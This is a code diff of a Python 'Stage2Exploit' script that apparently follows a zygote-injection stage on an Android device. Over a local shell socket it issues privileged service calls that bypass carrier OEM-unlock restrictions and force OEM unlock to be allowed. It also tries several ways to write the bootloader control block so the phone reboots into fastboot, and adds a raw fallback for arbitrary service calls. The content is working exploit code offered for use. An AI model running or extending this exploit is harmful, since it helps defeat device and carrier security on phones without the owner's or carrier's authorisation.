@@ -24,12 +24,8 @@ def swap_endianness(bytes_: bytes) -> bytes:
 
 
 def parse_service_result(service_result: str) -> tuple[bytes, str]:
-    """
-    サービスコールの結果をパースし、(生データ, エラーメッセージ) を返す。
-    """
-    # エラーがあるか確認
-    if "Exception" in service_result or "SecurityException" in service_result:
-        # エラーメッセージを抽出
+    """サービスコール結果をパースし、(データ, エラーメッセージ) を返す"""
+    if "Exception" in service_result:
         error_lines = [line for line in service_result.split("\n") if "Exception" in line or "error" in line.lower()]
         return b"", "\n".join(error_lines) if error_lines else service_result
 
@@ -59,17 +55,19 @@ def parse_boolean_result(result: bytes) -> bool:
 
 
 # Load AIDL definitions
-with open(Path(__file__).parent / "IOemLockService.aidl") as f:
-    oem_lock_aidl = f.read()
-oem_lock_service = parse_aidl_interface(aidl.fromstring(oem_lock_aidl), "IOemLockService")
+def load_aidl(filename: str):
+    with open(Path(__file__).parent / filename) as f:
+        return f.read()
 
-with open(Path(__file__).parent / "IPowerManager.aidl") as f:
-    power_aidl = f.read()
-power_service = parse_aidl_interface(aidl.fromstring(power_aidl), "IPowerManager")
+
+oem_lock_service = parse_aidl_interface(aidl.fromstring(load_aidl("IOemLockService.aidl")), "IOemLockService")
+power_service = parse_aidl_interface(aidl.fromstring(load_aidl("IPowerManager.aidl")), "IPowerManager")
+recovery_service = parse_aidl_interface(aidl.fromstring(load_aidl("IRecoverySystem.aidl")), "IRecoverySystem")
 
 known_services = {
     "oem_lock": oem_lock_service,
     "power": power_service,
+    "recovery": recovery_service,
 }
 
 
@@ -78,6 +76,14 @@ class Stage2Exploit:
         self.port = port
 
     def call_service(self, sock, service_name, function, *args):
+        if service_name not in known_services:
+            # Raw fallback
+            cmd = ["service", "call", service_name, function, *args]
+            sock.sendall(shlex.join(cmd).encode() + b"\n")
+            resp = sock.recv(10000).decode()
+            print(f"[RAW] {service_name} {function}: {resp}")
+            return resp
+
         interface = known_services[service_name]
         func = interface[function]
         parsed = func.parse_arguments(args)
@@ -94,7 +100,6 @@ class Stage2Exploit:
             raise ZygoteInjectionException(f"service call failed: {error}")
 
         if not raw:
-            # Void method, no return data
             return None
 
         ret = func.parse_return(raw)
@@ -106,9 +111,9 @@ class Stage2Exploit:
     def exploit_stage2(self):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             sock.connect(("127.0.0.1", self.port))
-            sock.sendall(b"\n")  # flush
+            sock.sendall(b"\n")
 
-            # --- OEM unlock (既存コード) ---
+            # --- OEM unlock (original) ---
             print("=== OEM Unlock ===")
             try:
                 carrier = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier")
@@ -121,8 +126,6 @@ class Stage2Exploit:
                         print("*** CARRIER OEM UNLOCK BYPASSED ***")
                 if not user:
                     self.call_service(sock, "oem_lock", "setOemUnlockAllowedByUser", 1)
-                    if not self.call_service(sock, "oem_lock", "isOemUnlockAllowedByUser"):
-                        print("Enable OEM unlock in developer options.")
                 if not allowed and self.call_service(sock, "oem_lock", "isOemUnlockAllowed"):
                     print("OEM unlock is now allowed!")
                 if self.call_service(sock, "oem_lock", "isDeviceOemUnlocked"):
@@ -130,37 +133,56 @@ class Stage2Exploit:
             except Exception as e:
                 print(f"OEM unlock error: {e}")
 
-            # --- BCB write: reboot to bootloader ---
-            print("\n=== Writing BCB (bootonce-bootloader) ===")
+            # --- BCB write attempts ---
+            print("\n=== BCB Write Attempts ===")
+
+            # 1. IPowerManager.reboot("bootloader")
+            print("\n[1] IPowerManager.reboot(\"bootloader\")")
             try:
-                # IPowerManager.reboot(confirm=False, reason="bootloader", wait=False)
-                result = self.call_service(
-                    sock,
-                    "power",
-                    "reboot",
-                    False,          # confirm
-                    "bootloader",   # reason
-                    False           # wait
-                )
-                if result is None:
-                    print("SUCCESS: BCB write command accepted.")
-                    print("The device should reboot to bootloader (fastboot) mode on next restart.")
-                    print("Please manually reboot the device now using: reboot")
-                else:
-                    print(f"Unexpected return value: {result}")
+                self.call_service(sock, "power", "reboot", False, "bootloader", False)
+                print("SUCCESS: IPowerManager.reboot called.")
             except Exception as e:
-                print(f"BCB write via service call failed: {e}")
-                print("Trying fallback: raw service call command...")
+                print(f"FAILED: {e}")
+
+            # 2. IRecoverySystem.setupBcb("bootonce-bootloader")
+            print("\n[2] IRecoverySystem.setupBcb(\"bootonce-bootloader\")")
+            for cmd in ["bootonce-bootloader", "reboot-bootloader", "bootloader", "fastboot"]:
                 try:
-                    sock.sendall(b"service call power 18 i32 0 s16 \"bootloader\" i32 0\n")
-                    resp = sock.recv(10000).decode()
-                    print(f"[FALLBACK RESPONSE]\n{resp}")
-                    if "Parcel(" in resp and "Exception" not in resp:
-                        print("Fallback command likely succeeded. BCB should be written.")
+                    result = self.call_service(sock, "recovery", "setupBcb", cmd)
+                    if result is not None:
+                        print(f"  {cmd}: Result={result}")
                     else:
-                        print("Fallback command may have failed.")
-                except Exception as e2:
-                    print(f"Fallback failed: {e2}")
+                        print(f"  {cmd}: SUCCESS (void)")
+                except Exception as e:
+                    print(f"  {cmd}: FAILED - {e}")
+
+            # 3. IRecoverySystem.rebootRecoveryWithCommand("--bootonce-bootloader")
+            print("\n[3] IRecoverySystem.rebootRecoveryWithCommand(\"--bootonce-bootloader\")")
+            try:
+                self.call_service(sock, "recovery", "rebootRecoveryWithCommand", "--bootonce-bootloader")
+                print("SUCCESS: rebootRecoveryWithCommand called.")
+            except Exception as e:
+                print(f"FAILED: {e}")
+
+            # 4. Clear BCB (to see if we can)
+            print("\n[4] IRecoverySystem.clearBcb()")
+            try:
+                result = self.call_service(sock, "recovery", "clearBcb")
+                print(f"clearBcb result: {result}")
+            except Exception as e:
+                print(f"clearBcb failed: {e}")
+
+            # 5. Service existence check
+            print("\n[5] Checking service list")
+            try:
+                sock.sendall(b"service call servicemanager 4 i32 0\n")
+                resp = sock.recv(10000).decode()
+                if "recovery" in resp:
+                    print("recovery service is present.")
+                else:
+                    print("recovery service NOT found in service list.")
+            except Exception as e:
+                print(f"Service list check failed: {e}")
 
             print("\n=== Done ===")
 
